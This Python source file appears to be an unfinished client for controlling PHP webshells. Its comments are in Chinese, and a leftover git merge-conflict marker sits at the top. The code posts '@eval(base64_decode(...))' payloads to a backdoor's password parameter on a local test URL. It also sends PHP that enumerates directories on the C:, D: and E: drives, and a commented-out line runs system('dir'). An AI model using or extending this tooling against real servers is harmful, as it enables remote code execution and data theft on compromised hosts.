<<<<<<< HEAD

'''
1.程序必须写大部分注释，一些基本语法除外
2.命名使用易理解拼音，eg:shu_ru_kuang

'''
>>>>>>> '第二次更新'
import base64
import urllib.request
import urllib.parse

from PyQt5.QtWidgets import QTreeWidgetItem
from PyQt5.uic.properties import QtWidgets


class php7:
    def Connect_shell(self):
        try:
            # shell = self.Ui.listWidget.currentItem().text()
            shell = "http://127.0.0.1/word/hello.php  1"
            # 返回选择行的数据

            shell2 = shell.split("  ")  #

            phpcode = "echo(hello);"
            phpcode = base64.b64encode(phpcode.encode('GB2312'))

            data = {shell2[1]: '@eval(base64_decode($_POST[z0]));',
                    'z0': phpcode}

            returndata = self.filedir(shell2, data)

            if returndata != "":
                '''box = QtWidgets.QMessageBox()
                box.information(self, "提示", "连接成功！")'''
                print("连接成功1")
                # self.Ui.shelllabel.setText(shell)
                # self.File_update()  #显示目录
                # self.Virtualshell()

            else:
                '''box = QtWidgets.QMessageBox()
                box.information(self, "提示", "连接失败！")'''
                print("连接失败")
        except:
            '''box = QtWidgets.QMessageBox()
            box.information(self, "提示", "连接失败！")'''
            print("连接失败")

    def filedir(self, shell, phpcode):  # 发送php请求
        # 请求头
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.84 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
            # 以表单的形式请求
        }

        postData = urllib.parse.urlencode(phpcode).encode("utf-8", "ignore")
        #print(postData)
        req = urllib.request.Request(shell[0], postData, headers)
        # 发起请求
        response = urllib.request.urlopen(req)
        #print(response)
        # data = (response.read()).deco de('utf-8')
        return response.read()


    def File_update(self):
        #shell = self.Ui.shelllabel.text()
        shell = "http://127.0.0.1/word/hello.php  1"
        if shell!="":
        #列出目录
            '''self.Ui.treeWidget.clear() #清空treeweight的所有内容
            self.Ui.treeWidget_2.clear() #清空treeweight_2的所有内容'''
            path=["C:","D:","E:"]   #列出3个盘
            #print(path)
            for i in path:  #循环列出c盘  D盘
                data=self.listfile(i)   #调用列出目录
                data = data.decode('utf-8',"ignore")
                #print(data)
                if data =='ERROR:// Path Not Found Or No Permission!':
                    #判断3个盘是不是存在
                    pass
                else:  #若存在 列出目录
                    listdata = data.split('  ')   # 分割data
                    '''t = QTreeWidgetItem(self.Ui.treeWidget)  #创建对象
                    #self.tree = QTreeWidget()
                    root.setText(0,i)  #创建主节点'''
                    listdata=listdata[:-1]   #去掉空格
                    for i in listdata:  #循环每一个元素

                        singerdata = i.split("\t")   #用\t将名字大小权限修改时间分割
                        #print(singerdata)
                        if singerdata[0][-1] == "/":   #判断是不是有下级目录
                            singerdata[0]=singerdata[0][:-1]   #创建c盘下的子节点
                            '''ld1 = QTreeWidgetItem(root)   #子节点位置
                            child1.setText(0, singerdata[0])   #'''
                            print(singerdata[0])

                        # else:
                        #     child2 = QTreeWidgetItem(child1)  # 创子子节点
                        #     child2.setText(0, singerdata[0])  # 赋值

                        #phpcode = "system('" + "dir" + "');"
        else:
            '''box = QtWidgets.QMessageBox()
            box.information(self, "提示", "请先连接shell！")'''
            print("请先链接shell")

    def listfile(self,path):  # 列出目录
        #path = "C:"
        #shell = self.Ui.shelllabel.text()  # 获取shell
        shell = "http://127.0.0.1/word/hello.php  1"
        # print(shell)
        shell = shell.split("  ")
        phpcode = '$D="' + path + '";$F=@opendir($D);if($F==NULL){echo("ERROR:// Path Not Found Or No Permission!");}else{$M = NULL;$L = NULL;while($N= @readdir($F)){$P =$D."/".$N;$T=@date("Y-m-d H:i:s",@filemtime($P));@$E=substr(base_convert( @fileperms($P), 10, 8), -4);$R = "\t".$T."\t". @filesize($P)."\t".$E."  ";if(@ is_dir($P)){$M.=$N."/".$R;}else{$L.=$N.$R;}}echo($M.$L);@closedir($F);};die();'
        # print(phpcode)
        data = {shell[1]: phpcode}
        #print(data)
        #print(self.filedir(shell,data))
        return self.filedir(shell,data)  # 返回数据


if __name__ == '__main__':
    print("hello")
    a = php7()
    a.Connect_shell()
    a.File_update()

